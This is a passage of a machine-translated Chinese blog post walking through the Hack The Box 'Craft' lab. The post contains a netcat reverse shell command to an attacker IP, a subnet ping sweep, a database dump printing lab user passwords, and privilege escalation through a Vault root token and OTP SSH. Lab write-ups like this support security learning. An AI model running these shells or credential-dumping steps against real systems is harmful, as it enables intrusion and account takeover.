translated">然后，我运行一个系统命令:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="40f7" class="mj ky iq mf b gy mk ml l mm mn">nc 10.10.14.72 9001 -e /bin/sh</span></pre><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi oi"><img src="../Images/720168d6b678af1cf335c1f245f63cc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:922/format:webp/1*0tsDa6FRwUjZHgNRkg_3LA.png"/></div></div></figure><p id="a058" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">看着我得到我的贝壳。注意，当我运行id时，我是root。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi oj"><img src="../Images/45e25d26f1f9f78f627f99e39749cf34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TlT8XqHVMJbgzWtxCXncWA.png"/></div></div></figure><p id="1e38" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我也试图得到一个合适的外壳，但没能这样做:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi ok"><img src="../Images/54426e23b7cdd4ca8daf149f09537ee9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1246/format:webp/1*M5fIfcziSXoGafOEbOU6Fg.png"/></div></div></figure><p id="fb89" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我运行ifconfig来检查我的ip，验证它是否是10.10.10.110。如果没有，那么最有可能的是我需要旋转，我可能在一个docker容器中。我还在/目录中找到了一个. dockerenv文件。这证明我们在一个容器里。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/d09a0b260a59a162d68547c617cef800.png" data-original-src="https://miro.medium.com/v2/resize:fit:1034/format:webp/1*864ppKAJyF5oCjsv3zslYg.png"/></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi om"><img src="../Images/c2bd02c638d13bd89c099cd72647c2e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*hwXxbFnHbUD3Jb1PTHt57Q.png"/></div></figure><p id="09c9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还运行了ping扫描，以防以后需要转换:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="9d2c" class="mj ky iq mf b gy mk ml l mm mn">for ip in $(seq 1 254); do (ping -c 1 172.20.0.$ip | grep "bytes from" | cut -d ":" -f1 | cut -d " " -f4 &amp;); done</span></pre><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi on"><img src="../Images/c3bb9e8ac966e78af9ac5e99c9a5c19f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mBrgYIT5yS2OMApyMT73Gg.png"/></div></div></figure><p id="fcc0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我决定回到应用程序的文件。为了检查存储库的文件，我使用find来查找brew.py，其中很可能有一些文件在它附近(有些文件可能不在Gogs中),这些文件可能很有趣:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/ce045081f6b7ca6eeeda293598e9bad4.png" data-original-src="https://miro.medium.com/v2/resize:fit:880/format:webp/1*ubKcKKgRUWFrx9DGuUuR2A.png"/></div></figure><p id="191b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我在机器内部，所以我尝试运行dbtest.py(这是我之前遇到的):</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi op"><img src="../Images/841b78896414eea87dfb3e0fee3f928d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XgeCxKePSsixtRbNViIeug.png"/></div></div></figure><p id="a765" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">请注意，在dbtest.py中，有一个导入设置:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi oq"><img src="../Images/c08925114ef6f416bb8b1f153dc0c4a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D0pcNeUn3sOt0B-YCXzmjw.png"/></div></div></figure><p id="3319" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我在craft_api下搜索设置模块:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/e4d09bc30c68dba1e5a5fc9d92980ca9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*2l4Ks-2UzF2hWct182Fvfg.png"/></div></figure><p id="1b88" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">注意settings.py不在Gogs:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi os"><img src="../Images/1b8db330c1a3bdb354a1f731a416ab76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*At02VAaTXdWI54u9n6WXLQ.png"/></div></div></figure><p id="8131" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">读settings.py，我找到CRAFT_API_SECRET和数据库详情。这是我运行dbtest.py时导入的内容。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/d5d746ca54a70bc950e9517ec5d2713c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*QQD3JA2Qh2At9QyfeDynlA.png"/></div></figure><p id="63d3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我可以运行python脚本，所以我决定创建一个类似于dbtest.py的脚本，但是使用不同的SQL命令。我尝试使用curl，但它没有安装在盒子里，幸运的是wget是可用的:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/da0c20500d193def5328b332583ca38a.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*G_oLc-8BvSLv2J8wCVe4qQ.png"/></div></figure><p id="dd08" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我将SQL改为“选择用户()；”为了验证这是否可行(我期待成为工艺用户)。注意，我还将fetchone方法编辑为fetchall。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/7ca2d4ee5383eb03b094c76e304533ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*IAiZuoMLZpX9uq7LaUQQkA.png"/></div></figure><p id="a052" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查数据库文件夹下的models.py，我可以看到id、brewer、name、style、abv是Brew下的列，id、username、password是User下的列。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nn"><img src="../Images/ead9b48e6221f069a64f196bec73d4ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RBV-i2cQNWH8mUG_17aMWQ.png"/></div></div></figure><p id="694a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我用SQL语句编辑fakedbtest.py来检查表名:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d8cc" class="mj ky iq mf b gy mk ml l mm mn">"SELECT table_name FROM information_schema.tables;"</span></pre><p id="c988" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这导致了许多表，但最重要的是Brew和Users表:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/76187d45ec5506877df619fe65b2f8e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:866/format:webp/1*bdcNsGOsy7H1CJUnHQK5PQ.png"/></div></figure><p id="3335" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">最后，我用SQL语句编辑fakedbtest.py，列出用户表下的所有数据:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="c134" class="mj ky iq mf b gy mk ml l mm mn">SELECT * FROM user;</span></pre><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/233e707b9a28645e99e11c912ddedb33.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*fdmlcY96FLf-l97S24Rz7g.png"/></div></figure><p id="ac1f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到了用户的凭证:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e113" class="mj ky iq mf b gy mk ml l mm mn">[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]</span></pre><p id="8ceb" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我在端口22和6022上尝试SSH上的凭证，但是它们都无效。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/ea465f9f73ba158c3fc90150359a7d81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*vPlZKSRkybfpQnsbuLJrpg.png"/></div></figure><p id="dcb8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我使用该凭据登录Gogs，该凭据对ebachman不起作用，但对gilfoyle起作用:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi oy"><img src="../Images/e64d656d3648b2c34ae26cc55ec552b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5gbFoAQL-lQrVeY1BrrtOg.png"/></div></div></figure><p id="26a2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我发现了一个飞行器红外线储存库:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi oz"><img src="../Images/c759585948167c7cdb997046382a40b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QAM6ljlIszRNgRMcG11JRw.png"/></div></div></figure><p id="1d26" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">它包括文件。ssh、mysql、nginx、flask和vault。包括正在运行的服务的配置。您可以查看它们，以便了解基础架构是如何构建的，以及它最终是如何运行的。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi pa"><img src="../Images/1d6507d7ef3c718327e725fd0a0a3527.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tLE6sEdPHzTpSp4rz6JbNA.png"/></div></div></figure><p id="2ffa" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在下面。ssh文件夹中，存在一个OpenSSH私钥:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi pb"><img src="../Images/17276d2bb68affa03020183243a6cca7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MmImTqGCk-7P-rnBCnUzHQ.png"/></div></div></figure><p id="7275" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我可以使用这个密钥作为gilfoyle登录，使用数据库中的相同密码:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi pc"><img src="../Images/180871f45763b0db0d5a54d16f667fd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TwKbCAaZYuWSTtQ1AM30gg.png"/></div></div></figure><p id="6043" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">现在我可以读取user.txt:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="fe94" class="mj ky iq mf b gy mk ml l mm mn">gilfoyle@craft:~$ cat user.txt <br/><strong class="mf ir">bbf4b...</strong></span></pre><h1 id="4a95" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">获取根目录:</h1><p id="2815" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">在运行ls -al之后，一个名为。金库令牌脱颖而出。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/b1c411bfa8b394863e78bc59b6b0f0ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1108/format:webp/1*EE3ZkgrTQ-0cnIvk4orozw.png"/></div></figure><p id="0bac" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查其内容:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="1fb6" class="mj ky iq mf b gy mk ml l mm mn"> f1783c8d-41c7-....</span></pre><p id="c1c7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">快速搜索也能找到哈希公司的金库。您可以在此阅读更多关于它及其常用命令的信息:</p><div class="pe pf gp gr pg ph"><a href="https://github.com/hashicorp/vault" rel="noopener  ugc nofollow" target="_blank"><div class="pi ab fo"><div class="pj ab pk cl cj pl"><h2 class="bd ir gy z fp pm fr fs pn fu fw ip bi translated">哈希公司/金库</h2><div class="po l"><h3 class="bd b gy z fp pm fr fs pn fu fw dk translated">请注意:我们非常重视Vault的安全性和用户的信任。如果你相信你已经找到了安全…</h3></div><div class="pp l"><p class="bd b dl z fp pm fr fs pn fu fw dk translated">github.com</p></div></div><div class="pq l"><div class="pr l ps pt pu pq pv js ph"/></div></div></a></div><div class="pe pf gp gr pg ph"><a href="https://www.vaultproject.io/docs/commands/" rel="noopener  ugc nofollow" target="_blank"><div class="pi ab fo"><div class="pj ab pk cl cj pl"><h2 class="bd ir gy z fp pm fr fs pn fu fw ip bi translated">HashiCorp的命令(CLI) - Vault</h2><div class="po l"><h3 class="bd b gy z fp pm fr fs pn fu fw dk translated">除了详细的HTTP API之外，Vault还具有一个命令行界面，该界面包装了常见的功能和格式…</h3></div><div class="pp l"><p class="bd b dl z fp pm fr fs pn fu fw dk translated">www.vaultproject.io</p></div></div><div class="pq l"><div class="pw l ps pt pu pq pv js ph"/></div></div></a></div><p id="3111" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我回到存储库并检查目录保险库下的文件:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi px"><img src="../Images/6a4f73d75fe0c15888293af9e9ac11bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*02e9ybbK6RMQVI8ghXh0vg.png"/></div></div></figure><p id="779c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这只是一个配置文件，SSL文件保存在vault下。另一个文件更有趣。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi py"><img src="../Images/2ce852a72411ed5e32c6d480bf0acb70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jjYNsh3mfm-XVDBT7f2ITg.png"/></div></div></figure><p id="9fe6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">请注意，ssh的密码已启用。检查可能的选项:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/e56806cb6a30dec64812be17818b0efc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1086/format:webp/1*gqjoNQFLYTZpVSvQVXkVyw.png"/></div></figure><p id="c592" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我尝试了令牌命令及其子命令(功能和查找):</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi pc"><img src="../Images/54ae57d3c1c0127e3c3f313540b171fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zi0_qLLyTobpOLuyumeRpw.png"/></div></div></figure><p id="9621" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">请注意，令牌的功能是root。</p><p id="b3f7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我尝试登录命令，并提示我提供令牌。为其提供令牌，以token_policies作为root用户对我们进行身份验证:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/dd65a2fe255e3070a8191b855b5bbbec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*K_sKPff1lOOmi-8kABMn8A.png"/></div></figure><p id="8229" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为存储库中提到了SSH，所以我解释了vault ssh命令:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi qb"><img src="../Images/8064e1cec15a4e3a9e9a96bff894c2f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SJlZTTHZD5T26M3OpjcHTg.png"/></div></div></figure><p id="40a3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Otp想起了secrets.sh文件中提到的内容:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="15b9" class="mj ky iq mf b gy mk ml l mm mn">vault write ssh/roles/root_otp \<br/>    key_type=otp \<br/>    default_user=root \<br/>    cidr_list=0.0.0.0/0</span></pre><p id="8ff7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">尝试通过-mode=otp使用ssh，并以root@localhost身份登录:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/b212c51144c918247bec0d545ddd3a2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*-8C1M_FFWbPssMXv5ZsTjw.png"/></div></figure><p id="ae69" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在可以登录并读取root.txt:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="eecd" class="mj ky iq mf b gy mk ml l mm mn">root@craft:~# cat root.txt<br/><strong class="mf ir">831d6...</strong></span></pre><p id="6c58" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">注意，端口6022是docker的东西。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi qd"><img src="../Images/5746b76f0983e6bd29910cd948085853.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c8VvQuIK0Y-Mt6prsQpdhQ.png"/></div></div></figure><p id="2436" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这就是我解决Craft的方法。解决这个盒子让我学到了很多东西。我希望更多的盒子是这样的。求解时似乎很直观。</p><p id="7e2a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我希望你能从中学到一些东西。感谢阅读我的文章！干杯！🍺</p></div><div class="ab cl qe qf hu qg" role="separator"><span class="qh bw bk qi qj qk"/><span class="qh bw bk qi qj qk"/><span class="qh bw bk qi qj"/></div><div class="ij ik il im in"><p id="47f5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><em class="ql">关注</em> <a class="ae jy" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ql"> Infosec报道</em> </a> <em class="ql">获取更多此类精彩报道。</em></p><div class="pe pf gp gr pg ph"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="pi ab fo"><div class="pj ab pk cl cj pl"><h2 class="bd ir gy z fp pm fr fs pn fu fw ip bi translated">信息安全报道</h2><div class="po l"><h3 class="bd b gy z fp pm fr fs pn fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="pp l"><p class="bd b dl z fp pm fr fs pn fu fw dk translated">medium.com</p></div></div><div class="pq l"><div class="qm l ps pt pu pq pv js ph"/></div></div></a></div></div></div>    
</body>
</html>